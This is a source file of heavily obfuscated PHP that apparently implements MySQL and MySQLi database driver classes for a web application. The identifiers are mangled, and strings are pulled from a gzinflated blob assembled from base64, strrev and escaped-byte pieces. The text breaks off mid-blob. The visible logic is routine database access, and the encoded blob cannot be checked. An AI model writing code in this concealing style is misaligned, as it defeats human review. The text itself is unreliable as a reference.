$Ù¾†Üü[] = $ÔÇ±éÀÁ; $ÆñËæËÒ[] = $this->parseKey($çéöŒöÏ); } } $Àı¼Ø§“ = $¥Ôı»‡½[901] . $this->parseTable($ÃüàÀ¡[$¥Ôı»‡½[279]]) . $¥Ôı»‡½[902] . implode($¥Ôı»‡½[50], $ÆñËæËÒ) . $¥Ôı»‡½[903] . implode($¥Ôı»‡½[50], $Ù¾†Üü) . $¥Ôı»‡½[904]; return $this->execute($Àı¼Ø§“); } public function insertAll($“†áÄ•Ë, $õšÒíğø = array(), $Ñı†‘™ = false) { $Ñ¦¾ŞÈü =& $_SERVER[ì™ı‰º¯]; if (!is_array($“†áÄ•Ë[0])) { return !1; } $¸Æ‰æÜƒ = array_keys($“†áÄ•Ë[0]); $€Ÿµ”€Æ = array(); foreach ($“†áÄ•Ë as $éğûˆÓ) { $¯›Ò˜‰Á = array(); foreach ($éğûˆÓ as $””ïÉ ü => $œÑß¬Æ) { $œÑß¬Æ = $this->parseValue($œÑß¬Æ); if (is_scalar($œÑß¬Æ)) { $¯›Ò˜‰Á[] = $œÑß¬Æ; } } $€Ÿµ”€Æ[] = $Ñ¦¾ŞÈü[260] . implode($Ñ¦¾ŞÈü[50], $¯›Ò˜‰Á) . $Ñ¦¾ŞÈü[904]; } array_walk($¸Æ‰æÜƒ, array($this, $Ñ¦¾ŞÈü[905])); $şöä—²Ş = ($Ñı†‘™ ? $Ñ¦¾ŞÈü[906] : $Ñ¦¾ŞÈü[907]) . $Ñ¦¾ŞÈü[908] . $this->parseTable($õšÒíğø[$Ñ¦¾ŞÈü[279]]) . $Ñ¦¾ŞÈü[902] . implode($Ñ¦¾ŞÈü[50], $¸Æ‰æÜƒ) . $Ñ¦¾ŞÈü[909] . implode($Ñ¦¾ŞÈü[50], $€Ÿµ”€Æ); return $this->execute($şöä—²Ş); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $–¸ŸúÎÍ =& $_SERVER[ì™ı‰º¯]; $this->error = mysql_errno() . $–¸ŸúÎÍ[4] . mysql_error($this->_linkID); if ($–¸ŸúÎÍ[12] != $this->queryStr) { $this->error .= LNG($–¸ŸúÎÍ[48]) . $this->queryStr; } think_trace($this->error, $–¸ŸúÎÍ[12], $–¸ŸúÎÍ[49]); return $this->error; } public function escapeString($¶”ü£èï) { if ($this->_linkID) { return mysql_real_escape_string($¶”ü£èï, $this->_linkID); } else { return mysql_escape_string($¶”ü£èï); } } public function parseKey(&$˜·°Îô, $¾ÜÍÙ€à = true) { $õêş­¼ =& $_SERVER[ì™ı‰º¯]; if ($¾ÜÍÙ€à) { $˜·°Îô = $this->parseKeyCheck($˜·°Îô); } if ($˜·°Îô != $õêş­¼[189] && !preg_match($õêş­¼[910], $˜·°Îô)) { $˜·°Îô = $õêş­¼[385] . trim($˜·°Îô, $õêş­¼[385]) . $õêş­¼[385]; } return $˜·°Îô; } } class DbMysqli extends Db { public function __construct($¡’¿Şíë = '') { $õËíß =& $_SERVER[ì™ı‰º¯]; if (!extension_loaded($õËíß[911])) { think_exception(think_lang($õËíß[14]) . $õËíß[912]); } if (!empty($¡’¿Şíë)) { $this->config = $¡’¿Şíë; if (empty($this->config[$õËíß[17]])) { $this->config[$õËíß[17]] = $õËíß[12]; } } } public function connect($¶Ê¢€ÊŒ = '', $œ§±ûÁÅ = 0) { $†ÌåÌÚ¸ =& $_SERVER[ì™ı‰º¯]; if (!isset($this->linkID[$œ§±ûÁÅ])) { if (empty($¶Ê¢€ÊŒ)) { $¶Ê¢€ÊŒ = $this->config; } $this->linkID[$œ§±ûÁÅ] = new mysqli($¶Ê¢€ÊŒ[$†ÌåÌÚ¸[885]], $¶Ê¢€ÊŒ[$†ÌåÌÚ¸[887]], $¶Ê¢€ÊŒ[$†ÌåÌÚ¸[888]], $¶Ê¢€ÊŒ[$†ÌåÌÚ¸[21]], $¶Ê¢€ÊŒ[$†ÌåÌÚ¸[886]] ? intval($¶Ê¢€ÊŒ[$†ÌåÌÚ¸[886]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‹ŠúÎûä = $this->linkID[$œ§±ûÁÅ]->server_version; $this->linkID[$œ§±ûÁÅ]->query($†ÌåÌÚ¸[889] . think_config($†ÌåÌÚ¸[890]) . $†ÌåÌÚ¸[58]); if ($‹ŠúÎûä > $†ÌåÌÚ¸[891]) { $this->linkID[$œ§±ûÁÅ]->query($†ÌåÌÚ¸[892]); } $this->connected = !0; if (1 != think_config($†ÌåÌÚ¸[22])) { unset($this->config); } } return $this->linkID[$œ§±ûÁÅ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($÷‰»¢Åõ) { $­¿Æ·¦Ú =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $÷‰»¢Åõ; if ($this->queryID) { $this->free(); } think_action_status($­¿Æ·¦Ú[23], 1); think_status($­¿Æ·¦Ú[24]); $this->queryID = $this->_linkID->query($÷‰»¢Åõ); if ($this->_linkID->more_results()) { while (($˜ºú¶°² = $this->_linkID->next_result()) != NULL) { $˜ºú¶°²->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¿ê­¯ç) { $­¨±ö—Í =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¿ê­¯ç; if ($this->queryID) { $this->free(); } think_action_status($­¨±ö—Í[25], 1); think_status($­¨±ö—Í[24]); $µ¼•Áª¤ = $this->_linkID->query($¿ê­¯ç); $this->debug(); if (!1 === $µ¼•Áª¤) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ç•Ê¦ò° = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ç•Ê¦ò°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Æ§èÒÃ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Æ§èÒÃ) { $this->error(); return !1; } } return !0; } private function getAll() { $—¼‰íıÆ = array(); if ($this->numRows > 0) { for ($ŒÂ“İ£ = 0; $ŒÂ“İ£ < $this->numRows; $ŒÂ“İ£++) { $—¼‰íıÆ[$ŒÂ“İ£] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $—¼‰íıÆ; } public function getFields($˜Îã¹”°) { $—ò„ÂşÀ =& $_SERVER[ì™ı‰º¯]; $î°¯ìÄ© = $this->query($—ò„ÂşÀ[896] . $this->parseKey($˜Îã¹”°)); $øùĞ¼œá = array(); if ($î°¯ìÄ©) { foreach ($î°¯ìÄ© as $üŸëœÒ½ => $”áŞ‰ı) { $øùĞ¼œá[$”áŞ‰ı[$—ò„ÂşÀ[31]]] = array($—ò„ÂşÀ[32] => $”áŞ‰ı[$—ò„ÂşÀ[31]], $—ò„ÂşÀ[33] => $”áŞ‰ı[$—ò„ÂşÀ[34]], $—ò„ÂşÀ[35] => (bool) ($”áŞ‰ı[$—ò„ÂşÀ[36]] === $—ò„ÂşÀ[12]), $—ò„ÂşÀ[37] => $”áŞ‰ı[$—ò„ÂşÀ[38]], $—ò„ÂşÀ[39] => strtolower($”áŞ‰ı[$—ò„ÂşÀ[40]]) == $—ò„ÂşÀ[41], $—ò„ÂşÀ[42] => strtolower($”áŞ‰ı[$—ò„ÂşÀ[43]]) == $—ò„ÂşÀ[44]); } } return $øùĞ¼œá; } public function getTables($’Ä÷ıÀü = '') { $ÄŞ”ªÙ =& $_SERVER[ì™ı‰º¯]; $ÎÌŒÇÇÖ = !empty($’Ä÷ıÀü) ? $ÄŞ”ªÙ[898] . $’Ä÷ıÀü . $ÄŞ”ªÙ[899] : $ÄŞ”ªÙ[900]; $È™Æ òÅ = $this->query($ÎÌŒÇÇÖ); $÷êÖ¿ = array(); if ($È™Æ òÅ) { foreach ($È™Æ òÅ as $ò«Ş => $´ˆ¯‹€) { $÷êÖ¿[$ò«Ş] = current($´ˆ¯‹€); } } return $÷êÖ¿; } public function replace($ù¡ŠŸ¡, $ãíß¹„Ö = array()) { $¶ÖÕû¢’ =& $_SERVER[ì™ı‰º¯]; foreach ($ù¡ŠŸ¡ as $§ÂŒéÍ” => $ÅªÑ×·ñ) { $½‡·«æ = $this->parseValue($ÅªÑ×·ñ); if (is_scalar($½‡·«æ)) { $ğÌµğ®[] = $½‡·«æ; $Ü³ßƒëÔ[] = $this->parseKey($§ÂŒéÍ”); } } $íğô½¥° = $¶ÖÕû¢’[901] . $this->parseTable($ãíß¹„Ö[$¶ÖÕû¢’[279]]) . $¶ÖÕû¢’[902] . implode($¶ÖÕû¢’[50], $Ü³ßƒëÔ) . $¶ÖÕû¢’[903] . implode($¶ÖÕû¢’[50], $ğÌµğ®) . $¶ÖÕû¢’[904]; return $this->execute($íğô½¥°); } public function insertAll($îÆ©ı›ï, $ıÕáÓ˜š = array(), $‚ñëŸĞë = false) { $õÒò²¿‹ =& $_SERVER[ì™ı‰º¯]; if (!is_array($îÆ©ı›ï[0])) { return !1; } $ÂÛŞ˜ï = array_keys($îÆ©ı›ï[0]); $¸’Îí€¿ = array(); foreach ($îÆ©ı›ï as $×õœôÖ©) { $óâ¦Í‹ô = array(); foreach ($×õœôÖ© as $…´¶¡ => $ ¢Å³ùÙ) { $ ¢Å³ùÙ = $this->parseValue($ ¢Å³ùÙ); if (is_scalar($ ¢Å³ùÙ)) { $óâ¦Í‹ô[] = $ ¢Å³ùÙ; } } $¸’Îí€¿[] = $õÒò²¿‹[260] . implode($õÒò²¿‹[50], $óâ¦Í‹ô) . $õÒò²¿‹[904]; } array_walk($ÂÛŞ˜ï, array($this, $õÒò²¿‹[905])); $Ô¡Í²ì£ = $‚ñëŸĞë ? $õÒò²¿‹[906] : $õÒò²¿‹[907]; $±öˆ’™ = $Ô¡Í²ì£ . $õÒò²¿‹[908] . $this->parseTable($ıÕáÓ˜š[$õÒò²¿‹[279]]) . $õÒò²¿‹[902] . implode($õÒò²¿‹[50], $ÂÛŞ˜ï) . $õÒò²¿‹[909] . implode($õÒò²¿‹[50], $¸’Îí€¿); return $this->execute($±öˆ’™); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ŠÌŞ½ =& $_SERVER[ì™ı‰º¯]; $this->error = $this->_linkID->errno . $ŠÌŞ½[4] . $this->_linkID->error; if ($ŠÌŞ½[12] != $this->queryStr) { $this->error .= LNG($ŠÌŞ½[48]) . $this->queryStr; } think_trace($this->error, $ŠÌŞ½[12], $ŠÌŞ½[49]); return $this->error; } public function escapeString($ÒûÒ“§½) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÒûÒ“§½); } else { return addslashes($ÒûÒ“§½); } } public function parseKey(&$« ø©ÑÂ, $“ßÁÆş = true) { $¡âÕ‘Ìµ =& $_SERVER[ì™ı‰º¯]; if ($“ßÁÆş) { $« ø©ÑÂ = $this->parseKeyCheck($« ø©ÑÂ); } if ($« ø©ÑÂ != $¡âÕ‘Ìµ[189] && !preg_match($¡âÕ‘Ìµ[910], $« ø©ÑÂ)) { $« ø©ÑÂ = $¡âÕ‘Ìµ[385] . trim($« ø©ÑÂ, $¡âÕ‘Ìµ[385]) . $¡âÕ‘Ìµ[385]; } return $« ø©ÑÂ; } } goto Aˆ±Š§©Ÿ¸; CßëĞÃÌ³: $fileSize = strrev(base64_decode($_SERVER[ÆĞ§üËİ][0])); function binCheckNeq($µÀÂÑ¤, $øÈ²¼Ú…) { return $µÀÂÑ¤ != $øÈ²¼Ú…; } $_SERVER[$_SERVER[ÆĞ§üËİ][1]] = $fileSize($_SERVER[$_SERVER[ÆĞ§üËİ][2]]); goto EÉ›íÈãÙ; cöéèÜ³ÓÛ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\354\231\375\211\272\257", "\212\233\225\221\256\302"); $_SERVER[ì™ı‰º¯] = explode(strrev('|||'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\170\33\325\325\60\314\326\262\4\136\350\13\205\226\165\60\11\136\242\45\166\166\47\216\43\333\162\254\104\266\34\111\316\202\355"."\x4c\xc6\xd2\x48\x1a\x5b\xd2\xc8\x9a\x91\x97\x24\x6c\x25\x10\x20\xa4\xf0\xb6\x10\xa\x4\x68\x21\xec\x25\x40\x29\x3b\x1\x42\xd9\xca\xde\x85\x40\x59\x4a\x97\x24\xac\x85\x42\xa\xb4\x85\xc2\x77".strrev('†ş_ÙøŞ_½¿è¾Ícy/†ñxŸsœ÷=ÏsÜåÜË¹ïtHÏ=ÿÏşğ)—s—').base64_decode('0d9vrdmHhk9Yf8Be5M/h68+vqemYcdDkroMv/OWt2hbtVu38SPiZZ0OHPP/zhcFd')."\327\76\63\276\153\357\275\336\275\350\206\57\32\121\146\132\266\221\376\50\171\323\126\364\61\303\262\55\12\110\230\371\224\221\246\141\43\117\177\375\364\247\47\32\56\352\71\323"."\326\151\324\107\177\124\336\56\364\257\65\234\65\130\272\332\25\211\253\261\236\356\356\140\64\16\231\32\345\364\234\231\204\120\101\53\152\71\370\176\101\57\132\250\65\162\165\152".base64_decode('wSzoeQdEAJKarQ1oFtTU1qK2BbvDkeVqfHl3EHIMqMMlvThOYyQYs7WiHTdyOs8x')."\x5a\xe4\xed\x6a\x9\x2e\x8\x75\x29\xf1\x68\xa0\x2b\x16\x68\x8d\x87\x22\x5d\x14\xdc\x1a\xe9\xec\xc\xc5\xcb\xe1\xd1\x48\x38\xdc\x12\x68\x5d\x54\x9e\xd2\x1d\xd\x2c\xe8\xc\x28\xa8\x7d\x59\x5d".base64_decode('NfIps0ZZSVNWKrU00G7o2SQN5jXWHHu8AKE4D6FpypeyWRrp4qGkntJKWRitNjlS').base64_decode('KBo5jXV6kT7OoTSglWzTyCdoJDhmFzUBR21NoInW81BVLBgOtsYV3EClPRrpVGAS')."\x72\x9a\x65\xeb\x45\x65\x69\x47\x30\x1a\x54\x70\xa3\x9b\xaa\x49\x5f\xab\x15\xc0\x97\x2e\x34\x14\x4a\x20\x1c\x56\xf6\x54\x83\xad\xe7\xa\xac\x1a\x5a\xa6\x42\x65\x91\x68\x5b\x30\xaa\xb4\x2c\x57".strrev('­¬©’ÄtüL–£-ÎƒAcÛÚDˆ4áŞ€<”hÁ©©m&h-PûÌÎ\\Ì%Ä').base64_decode('jmjZEkPTIfpbDT/wa1qAusNG3igBmkIVpsmXFQRKLLfOIHoSAjlU3oSVh5bhCA02')."\315\243\277\163\40\323\200\212\323\364\242\255\352\371\204\231\64\362\260\130\233\1\351\64\73\323\126\64\120\6\32\117\231\331\44\13\133\306\52\350\112\312\310\352\135\245\234\234"."\x85\x47\x13\x19\x23\x9b\x2c\xb2\xf5\xf5\x75\x39\x69\x34\xcc\x97\x2b\xce\x2b\x62\x5\xd4\x92\x35\x6c\xa5\x1b\xa9\x71\xb1\xde\x70\xbe\x6e\x9e\x6a\x99\xa5\x62\x42\xf\xa1\xf5\x41\xe3\xf5\x0\xd6".base64_decode('bRt1DsbGMHsKWVNLxvQi75phtqOKIiVbBpZItnazmGtDlAG+j1aF0VMhYYiti6Q0')."\142\376\232\336\63\275\137\366\367\316\107\377\324\2\351\353\203\66\145\364\154\126\325\307\164\130\70\271\344\164\213\15\206\337\32\60\362\176\4\241\321\120\104\315\150\126\246\63"."\71\135\45\245\240\311\371\244\76\346\53\144\12\64\52\226\164\237\3\261\361\320\165\231\166\120\242\313\131\63\241\145\345\56\322\160\306\266\13\61\75\237\304\43\1\135\61\107"."\363\144\244\12\272\16\231\332\74\112\122\351\124\226\53\35\215\106\243\305\12\346\262\74\304\172\307\141\26\7\332\143\154\72\223\51\32\30\140\333\102\25\174\320\260\10\205\23"."\313\123\53\24\262\106\102\263\15\63\357\67\23\266\156\173\55\273\250\153\120\143\40\221\320\55\313\333\152\346\355\242\231\365\6\262\131\163\324\33\51\32\151\43\337\250\324\321"."\74\70\21\55\152\57\46\200\215\260\122\253\346\50\30\161\360\147\352\232\112\166\312\73\213\255\100\236\273\250\345\255\224\136\364\6\141\145\64\52\250\261\234\12\262\154\155\206"."\x55\x30\x2d\x3\x37\xaf\x51\xd1\x6c\x5b\x4b\x64\x30\x5\x11\xd5\x37\x7d\x4d\x7e\x23\x9f\x35\xf2\x7a\x59\xde\xe0\x58\xc1\x28\xea\x16\x6b\xab\xb2\xa0\x33\xe\x95\xa0\xda\x75\x6f\x77\x51\x4b\xe7".base64_decode('tEalUBpAIwMrtQKM5oahaVQSOOpRciXL9hZ1RIoMtN3BIIdS3k68rgw96Y0hig3g')."\251\123\246\51\10\165\24\226\106\241\35\361\170\267\32\152\107\133\162\127\120\355\14\304\133\73\240\331\266\226\146\155\16\43\72\314\253\144\300\145\136\264\276\60\162\165\241\276".base64_decode('CmC3OaoX0YdbxhuVITM5YI75WBLOHEOEhmXG012wvVEtn8bjMzBu64CC1kjaOdBh')."\x3d\x9f\xb6\x33\xac\x60\x2c\x18\x5d\x12\x8c\xaa\xb1\x48\x7b\x7c\x69\x20\xa\x9b\x79\x1e\x61\xc9\x18\xfb\x14\xae\x3a\xeb\x8d\xea\x49\x34\xf4\x9\x9b\x95\xd3\xa\x78\xd4\x58\x1e\xbc\x38\xf0\x5c".strrev('Eë\\œ—ÓWUŸSPé? Ğúv‰#!O6í¸ÈØwV.r¼™B×›L'."\0".'´8ZX`¼T±').base64_decode('/9bV9va1+er6m/2GKOOv99UrDVNmKN2I9TC0rAKdLssxRYkscg6LwOa8mde/ZnDw')."\336\45\55\173\327\260\122\140\64\270\270\47\30\213\253\235\301\170\107\244\15\276\36\14\100\50\154\322\145\313\172\333\113\177\372\141\166\373\351\217\152\130\355\322\266\202\243\234".base64_decode('/KjmwCCajE6d0dgUpdGhnJaWiDyG4linWdSdkDV8q1pqJPkegaIdupHOwHgZuLaE')."\x99\x35\x8b\x5a\x16\x53\x46\xb6\x28\x74\x46\xad\xd2\x6\x50\x2b\x20\xc2\x22\x12\x33\x72\x5\xd6\x58\x3b\x53\xca\xd\x48\x41\xa0\xf6\x36\xdf\xa9\x2c\x84\x49\x2c\x9c\x31\xf9\xce\x66\x16\x21\xd4"."\350\207\42\223\32\332\141\131\106\374\261\251\350\177\101\344\223\146\116\143\44\223\20\73\75\111\251\35\5\325\71\122\72\164\115\154\327\166\321\66\61\264\350\310\202\206\66\143"."\302\24\247\165\326\244\22\157\33\153\145\122\317\352\154\134\62\72\333\60\246\100\66\264\341\361\121\113\361\331\103\174\37\202\212\235\332\260\242\250\44\46\357\54\276\24\63\312".base64_decode('ApBFO1SEzLiIdxf1lAGLNI9mpFMrDrE+oBkQuIIjEh6194TDamukK45YagpZGg3F')."\203\14\157\3\155\152\240\265\173\15\333\170\305\214\102\6\114\140\234\210\57\330\347\221\6\230\131\324\34\277\330\346\20\305\56\230\171\113\367\46\240\204\140\275\313\222\222\142"."\27\240\71\244\235\303\265\31\214\171\265\334\52\157\16\55\1\57\157\250\163\17\126\140\167\240\133\171\10\346\106\20\167\74\214\350\124\304\66\377\356\110\14\12\64\143\50\142"."\xc0\x6\xf4\x22\x7c\xac\xbb\x7\x92\x72\x12\x5e\x2c\x8\x2\xf0\x20\x40\xa5\x8c\x6\x6c\x55\x60\x69\x8c\x11\xe6\x12\xca\x5f\x34\x56\x69\xa2\x4b\xcd\xac\x3d\xac\x23\xb9\xac\xe0\xe7\x9c\xbd\xf2"."\x8a\x91\x8f\x77\x84\xba\x16\xa9\x9d\x91\xb6\x60\x58\xd\x75\x21\xca\x14\x2f\x87\xf7\x74\xb7\x5\xd8\x54\xca\xf0\x96\x48\xbc\xc3\x1\xed\x41\xb4\x69\x49\x20\x1c\x72\x67\xf\x2e\xb\xc5\xe2\xb1"."\212\111\10\326\23\164\245\240\203\140\167\64\330\36\132\306\243\355\241\140\270\55\246\266\6\132\73\104\236\256\100\47\104\324\24\76\212\131\176\147\176\25\21\331\30\77\320\251"."\43\370\160\312\6\113\165\234\241\124\166\72\120\5\16\241\315\124\7\114\203\356\342\43\61\351\11\34\210\23\146\211\155\1\234\221\314\61\312\220\323\140\21\151\154\243\254\241".strrev('hiä#Šïrse @epéÅ=qP-eø ÷Â2Äq`İ$q€Ñ¨Ø¦ Jµ?').base64_decode('BgLk7I0wgcwIfMZAS6loB1hzUuLcq0a6g9EAPjWrS6ORrgVQYDSjswaEYPhrGHMF')."\x87\x67\x5b\x90\x21\xc4\x19\x69\xb0\x56\x72\x62\xd0\x7\x4d\x36\x94\x6b\xe8\xcf\xc9\xf4\x7\x31\x85\xf0\x71\x3d\xcf\x46\x7d\x0\x53\x64\xb6\xbb\xb0\x40\xa\xad\x6\x46\x4d\xcd\x12\xff\xda\x80"."\x69\xc2\x17\xb2\x98\x3f\x58\xc3\x8\x6\x3f\x7c\xf\x5a\xc\x49\xc6\x18\xa9\x99\xc\x1f\x1c\x83\x5d\x21\x1e\x59\x14\xec\x52\x19\x66\xd1\x98\x84\x8d\x14\x80\x8e\xb3\x91\x28\xc\x88\x6d\xe\xb1"."\63\31\115\214\6\143\154\225\27\365\341\222\301\206\313\357\233\14\130\254\243\215\7\76\357\137\321\67\72\271\246\327\73\331\327\217\2\265\165\363\151\24\142\175\76\107\164\42"."\224\57\25\171\151\314\66\325\130\315\265\215\175\376\76\177\115\163\143\157\300\273\112\363\256\232\342\235\355\355\237\334\347\253\235\14\200\376\325\15\236\151\247\342\14\50\143\363".base64_decode('Sf3op6mveVKf9+TTVs7v7euvbpx8Yp/vpL7R/rraZvadRKmIzpuJcd7U5OQa1CTE')."\x4e\xf1\x2c\x79\x42\xf2\xa4\xc\x2c\x61\x95\x51\x10\xd0\xd5\x33\x4e\x65\x70\x34\x87\x7a\x5a\x94\xe8\xf5\xf6\x4d\xee\x6f\x96\xca\x49\x20\xf7\xb7\x10\xbb\x84\xe8\x6f\x86\xe7\xb\x78\x4f\xc1\x3d".base64_decode('40Xxugf8KOUTgnridTGgJYAOGOk8X0JoJ+fndCcXv3oS/T2VTWRah0VPBHFFwM5S')."\336\30\146\142\210\274\76\14\1\323\146\370\75\240\333\243\72\103\17\4\167\304\21\162\260\243\43\112\222\142\131\302\30\302\27\360\201\212\343\50\107\46\243\240\142\16\153\224"."\307\222\172\36\346\351\100\310\155\45\264\202\36\223\172\250\252\361\100\113\70\250\62\12\3\224\230\305\11\125\154\341\42\73\324\65\101\121\31\175\110\10\26\236\234\126\140\345"."\x5b\xc3\x59\x85\x10\x6\x45\x2f\x16\xcd\x62\x23\x91\x5e\x5a\xa5\x2\x66\xc8\xd0\xc9\xcc\x46\x63\xab\xa0\x33\xbd\xd2\x34\x4f\xa1\x43\xe\xe5\x54\x79\x2\xa\x1a\xe3\x13\xf0\x69\x5b\x17\x8b\x1e"."\123\50\150\123\101\314\220\205\330\50\306\335\370\153\372\372\112\275\172\262\277\27\41\276\346\115\365\257\236\172\152\55\343\362\375\175\350\17\213\4\52\310\321\124\116\15\125\264".base64_decode('P/twO7goxRHhyTRqFjmLVHAw0bZpa1lHFXEMgcnlGzcIFehshwXFwlu5JIAk5LSL')."\37\342\271\154\104\222\200\341\22\61\335\366\361\34\36\51\121\105\161\207\60\270\11\4\4\51\43\217\226\123\253\264\325\121\321\116\154\334\262\365\234\103\152\151\351\132\61\221"."\151\57\145\263\66\147\345\263\306\20\174\1\326\12\10\121\275\364\107\231\134\251\150\273\131\144\47\342\72\150\106\125\135\245\214\241\174\36\235\137\145\124\23\233\354\202\0\142".base64_decode('Z+JKDRP4KaEupSUSCQcDXQrez2EfQsxCLNgdQJsYPlvH4kGQQYbavKzeZd4QnLB4')."\xc0\x80\x61\x37\xb\x98\x82\xa8\x68\x4c\x54\x74\x92\x19\x62\x73\x89\x8\xa2\xcd\xb2\x82\x84\xc\x62\x98\xd1\xf4\x60\x9\x91\x7\x73\x1a\x1e\xd4\x7\xf\x3e\x1e\x79\x4\xef\xee\x11\x2\x37\xcf"."\x88\xa1\x8f\x92\x0\x67\xb6\x3d\xc0\x83\x7b\x6c\xad\x88\x18\x6\xcc\x24\x43\x30\xd4\xe6\x31\xac\x36\x72\x6c\x20\x1f\x20\x49\xac\x41\x76\x6\xcb\x41\xb2\xda\xb8\x87\x36\x2e\xac\x8f\xe8\x59\xf"."\x6b\x9a\x87\xb5\xd8\xc3\xce\x86\x1e\x72\xa0\x6b\x83\x66\xf5\xa0\xc5\x5\xcd\x22\x41\x44\x43\x33\x1e\x8c\x4e\x18\x9b\x3d\x42\x4\xe8\x31\x47\xf3\x7a\x91\x64\x81\x61\x12\x27\xe\x8f\x38\x8d\x78"."\xd2\x45\xb3\x54\xe8\x66\xdf\x94\x62\xb4\x59\x0\x10\x6d\xe6\x80\xa8\x69\xda\x1e\x76\xd6\xf4\xc8\xc7\x50\x68\x45\x80\xad\x9a\x8a\xc3\x59\xb9\x37\x64\xfc\xdd\x8d\x80\xb9\xc3\x49\xe5\xa3\xf4\xd".base64_decode('k1U+H84j92paI5zpT2V7niOPmF62DLO6iOEJEKElYhnjDrVrIzLmVcJCtvMwNBbS')."\77\41\367\25\234\260\373\134\351\226\10\343\217\306\265\164\114\372\234\255\245\331\267\60\51\103\251\173\314\112\303\121\75\61\236\20\7\325\66\351\370\353\214\71\27\127\11\325".strrev('¡É1ch8`‚‘—!%è]¯7ĞV;ìø¶q xa>zÇ'."\0".'c*B´«*ÈzN®RÓ').base64_decode('DbA9y4aoQU4GYu1xxvDS8xHiTa5VYlyiEQ62x5WFEUTpDFOlZVScWSH/mHnFUTcb')."\x2e\xa5\x89\xa4\x8b\xb8\x96\x4f\x52\xc8\x4a\xb4\x2b\xac\x6c\xaa\x62\x1f\xa9\x72\x14\x17\x48\xe3\x6c\x84\x87\x45\x1d\x5f\x13\xf3\x2f\xf\x2\x46\xe\xd2\x7d\xb1\x93\x31\x50\x44\x6c\x9c\x25\xe0".base64_decode('EjUrQQNYTA4hncHE1MpYKhEjAWDtcnwXR8UKYyih4A9ABYSvwQTHK9aKFHUOuQsj')."\135\333\55\36\242\156\43\77\156\344\145\211\226\200\256\341\73\266\140\30\360\122\167\311\340\332\366\24\246\133\214\220\230\171\100\222\346\311\32\371\41\151\63\27\342\34\324\172"."\x5c\x54\x6a\x3b\xd4\xe4\x6a\x39\x23\xba\x5e\xc7\x82\x6\x24\xcf\x68\x45\x31\x7e\x8c\xc\x61\x5a\x20\x44\x83\x38\x8b\x88\x4a\xd9\x52\xda\x88\xe0\x5f\x1c\x65\x24\x62\x62\xd9\xe3\xac\xc1\x72\xd0"."\x59\x29\x8d\xb6\x79\xc8\x6f\x7\xea\xb8\xbc\x42\xf9\x8c\x60\xd2\xc1\x32\x51\x1a\x84\x96\x7f\x18\xd\xf\xfa\x21\x1d\x89\x9b\x1e\x2c\x4b\x44\x3f\x74\x97\xb7\x58\x93\x71\x26\x86\xea\xa5\x5c\x1b".base64_decode('XNng8BK05gFX8BjXMJoBvIYqSQw4zXESNNqSAKfvaNdEex4NI9Y+i7a6og8vkQV4')."\xc3\x62\xe3\x43\xa9\x9b\x8c\x72\x31\x1d\xf5\x19\xca\x89\xda\x62\x65\x69\x72\x6e\x21\x2d\xc2\xb4\x5f\xec\x15\x6c\x5c\xc5\xa\x13\x63\x2d\x96\x53\x5a\x34\x8\xf\xad\x5a\xde\xe\x8c\xc0\x95\xe3"._kodDe('MTLa4IBprmTIV1T0Ems61iyXx96SnV1SBJYNiHldvkouHj57/nNqhW9GFdM4qXk1nA==').base64_decode('dzMfOj7AnbJnisSLCTKz2iL7Aux+p7rm2TZNdCYt+oroy6JBEokD+kCuHPE2KHMQ')."\274\26\13\45\110\304\332\311\50\261\222\261\202\306\150\64\234\70\112\374\63\234\253\243\321\274\221\30\22\53\125\33\321\20\376\101\325\244\63\322\345\60\211\207\71\143\214\151"."\x47\x30\x69\xd8\x18\x82\x17\xa3\xc9\xe4\xde\x22\xa3\xd8\x31\x5\x4c\x26\xd9\x64\xe7\x29\x9b\x7c\x71\xca\xf0\x4c\x72\xe4\x74\xf2\xe\x0\xac\x23\x5b\xba\x4f\xb0\x3a\x95\xaf\xd9\x13\x66\x1\x30"."\x42\xd2\x2f\xc9\x99\x23\xba\x4\xf4\x59\xb6\x59\x10\x29\x52\x94\x26\x4b\x49\xa2\x52\x29\x17\x9f\x24\xd2\x22\xb4\xbe\x92\x84\x61\x16\x43\x46\xf2\x42\x59\x72\xf6\xa6\x4b\xd8\x87\x4f\x1b\x3e\x31".base64_decode('qqG2QLHIEJh2E1/iIKAMwrQwxlZfpe2KVh4cEdojtCr8YR9d/j4tmYywiyw5XJ5V')."\x96\x43\x56\xae\x88\xa8\xf2\xf0\xaa\xa4\x58\xe5\xec\x81\x6c\x56\x5c\xff\xbb\xe3\x7b\x2c\x42\x97\xbd\x5c\x48\x86\xec\xb1\x58\x3b\x39\xf8\xb2\xeb\xb8\x4a\x30\x7e\xc8\x91\x97\x9d\x93\x51\x77\xb3"."\xf1\x4e\x52\xbd\x67\x96\x85\x2d\x4e\xf7\x79\x84\x4f\x63\xe5\x38\xda\xe5\x5b\x33\x46\x5e\xb7\xf8\x66\x5d\xb4\x2